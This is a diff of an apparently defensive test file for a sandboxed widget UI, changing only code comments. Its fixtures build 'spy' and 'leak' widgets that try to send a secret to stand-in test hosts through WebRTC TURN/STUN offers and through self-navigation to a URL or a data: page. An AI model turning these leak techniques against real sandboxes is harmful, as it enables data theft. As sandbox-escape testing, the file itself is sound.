@@ -20,7 +20,7 @@ const STORE = "chrome://browser/content/webaios/store.sys.mjs";
 const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 const host = (name: string) => `${name}.${SFX}:${HTTP}`;
 
-/** Electron's AFFICHAGE (accueil.spec.ts): shows the data it receives. No `e.source !== parent` test: in a sandboxed frame it is not parent (accueil.e2e.ts). */
+/** Shows the data it receives. No `e.source !== parent` test: in a sandboxed frame it is not parent (accueil.e2e.ts). */
 const DISPLAY = `<!doctype html><meta charset="utf-8">
 <pre id="donnees"></pre><span id="statut"></span> <span id="messages">0</span>
 <script>
@@ -34,7 +34,7 @@ const DISPLAY = `<!doctype html><meta charset="utf-8">
   });
 </script>`;
 
-/** Electron's codeRtc (accueil.spec.ts): an offer to a fake TURN/TCP and STUN/UDP; writes its result with `note`. */
+/** An offer to a fake TURN/TCP and STUN/UDP; writes its result with `note`. */
 const rtcCode = (tag: string, note: string) => `try {
   const pc = new RTCPeerConnection({ iceServers: [{ urls: "turn:${tag}-turn.${SFX}:15366?transport=tcp", username: "SECRET", credential: "x" }, { urls: "stun:${tag}-stun.${SFX}:15367" }] });
   pc.createDataChannel("x");
@@ -42,7 +42,7 @@ const rtcCode = (tag: string, note: string) => `try {
   ${note}("lancé");
 } catch (e) { ${note}("erreur " + e.name); }`;
 
-/** Electron's spy display (accueil.spec.ts:718), its addresses under espion.<SFX>. */
+/** A spy display, its addresses under espion.<SFX>. */
 function spyDisplay(): string {
   const a = `http://${host("espion")}`;
   const inFrame = `<script>const noter = (t) => parent.postMessage({ imbrique: t }, "*"); ${rtcCode("espion-imbrique", "noter")}</script>`;
@@ -252,7 +252,7 @@ describe("the UI's network", () => {
     writeFileSync(path.join(pages, "worker.html"), workerPage);
     writeFileSync(path.join(pages, "worker.js"), workerCode);
     widgetFiles(dataDir, "espion", spyDisplay());
-    // Electron's widgetsFuite: the display navigates itself to the server, or to data:.
+    // Leaking widgets: the display navigates itself to the server, or to data:.
     widgetFiles(dataDir, "fuite", DISPLAY.replace("</script>", `setTimeout(() => (location = ${JSON.stringify(`http://${host("fuite")}/fuite-navigation?d=secret`)}), 1500);</script>`), "reste");
     widgetFiles(dataDir, "fuite-data", DISPLAY.replace("</script>", `setTimeout(() => (location = "data:text/html,<pre id=donnees>pirate</pre>"), 1500);</script>`), "reste");
     widgetFiles(dataDir, "fuite-cadres", framesDisplay);
